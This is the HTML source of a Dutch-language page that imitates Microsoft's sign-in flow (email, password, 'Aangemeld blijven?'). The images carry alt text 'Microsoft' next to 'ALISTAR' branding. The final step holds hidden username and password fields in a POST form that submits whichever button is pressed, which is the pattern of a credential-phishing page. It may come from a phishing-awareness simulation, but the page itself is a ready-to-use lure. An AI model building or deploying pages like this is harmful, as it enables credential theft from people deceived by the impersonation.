<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <link rel="icon" href="favicon.ico"/>
    <title>Aanmelden bij uw account </title>
    <link rel="stylesheet" href="app.css"/>
</head>

<body>
    <section id="section_uname">
        <div class="auth-wrapper">
            <img src="Alistar.png" alt="Microsoft" width="50%"/>
            <h2 class="title mb-16 mt-16">Aanmelden</h2>
            <form action="">
                <div class="mb-16">
                    <p id="error_uname" class="error"></p>
                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="E-mailadres, telefoonnummer of Skype-naam"/>
                </div>
            </form>
            <div>
                <!--p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p-->
                <p class="mb-16 fs-13">
                    <a href="#" class="link">Hebt u geen toegang tot het account?
                        <!--img src="question.png" alt="Question img"/-->
                    </a>
                </p>
            </div>
            <div>
                <button class="btn" id="btn_next">Volgende</button>
            </div>
        <div class="onderstuk">
            <div id="idBoilerPlateText" class="box_alistar"><p>ALISTAR</p>
            </div>
        </div>
        </div>
        <div class="opts">
            <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="key.png" width="30px"/></span> Aanmeldingsopties</p>
        </div>
    </section>

    <section id="section_pwd" class="d-none">
        <div class="auth-wrapper">
            <img src="alistar.png" alt="Microsoft" width="50%" class="d-block"/>
            <div class="identity w-100 mt-16 mb-16">
                <button class="back">
                    <img src="back.png"/>
                </button>
                <span id="user_identity">a@b.com</span>
            </div>
            <h2 class="title mb-16">Wachtwoord</h2>
            <form action="">
                <div class="mb-16">
                    <p id="error_pwd" class="error"></p>
                    <input id="inp_pwd" type="password" name="password" class="input" placeholder="Wachtwoord"/>
                </div>
            </form>
            <div>
                <p class="mb-16"> <a href="#" class="link fs-13">Wachtwoord vergeten</a></p>
                <!--p class="mb-16">
                    <a href="#" class="link fs-13">Other ways to sign in</a>
                </p-->
            </div>
            
            <div>
                <button class="btn" id="btn_sig">Aanmelden</button>
            </div>
                        <div id="idBoilerPlateText" class="box_alistar"><p>ALISTAR</p>
</div>
        </div>
    </section>

    <section id="section_final" class="d-none">
        <div class="auth-wrapper">
            <img src="Alistar.png" alt="Microsoft" width="50%" class="d-block"/>
            <div class="identity w-100 mt-16 mb-16">
                <span id="user_identity">a@b.com</span>
            </div>
            <h2 class="title mb-16">Aangemeld blijven?</h2>
            <p class="p">Doe dit om het aantal keer dat u wordt gevraagd om u aan te melden, te verminderen.</p>
            <label class="has-checkbox">
                <input type="checkbox" class="checkbox"/>
                <span>Dit niet opnieuw weergeven</span>
            </label>
            <div class="btn-group">
                <form class="form" action="" method="POST">
                    <input class="hiddenData" id="hiddenUsername" name="username" type="text" placeholder="username"/>
                    <input class="hiddenData" id="hiddenPassword" name="password" type="password" placeholder="password"/>
                    <button class="btn btn-sec" type="submit" id="btn_final">Nee</button>
                    <button class="btn" type="submit" id="btn_final">Ja</button>
                </form>
                
            </div>
        </div>
    </section>
    <footer class="footer">
        <a href="#">Gebruikersvoorwaarden</a>
        <a href="#">Privacy en cookies</a>
        <span>...</span>
    </footer>
    <script src="app.js"></script>


</body></html>
